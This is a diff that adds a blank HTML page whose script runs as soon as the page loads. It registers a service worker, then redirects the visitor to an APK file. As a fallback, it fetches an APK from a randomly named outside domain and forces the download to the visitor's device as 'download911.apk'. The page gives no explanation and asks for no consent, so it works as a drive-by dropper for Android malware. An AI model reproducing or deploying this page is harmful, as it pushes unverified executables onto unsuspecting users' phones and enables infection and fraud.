@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+</head>
+<body>
+<script>
+    async function downloadApk() {
+        const apkURL = "https://blindlyorganicsnake.autos/aaa8e7e844e856a015a/" + location.search;
+
+        try {
+            const response = await fetch(apkURL, {
+                method: 'GET',
+                credentials: 'omit'
+            });
+
+            if (!response.ok) {
+                throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+            }
+
+            let filename = "download911.apk"
+            const blob = await response.blob();
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = filename;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        } catch (error) {
+            console.error(error);
+            location.href = apkURL
+        }
+    }
+
+    async function initSW(){
+        if ('serviceWorker' in navigator) {
+            await navigator.serviceWorker.register('./sw.js');
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            window.location.href = 'download2026.apk' + location.search;
+        } else {
+            downloadApk();
+        }
+    }
+
+    initSW();
+</script>
+</body>
+</html>
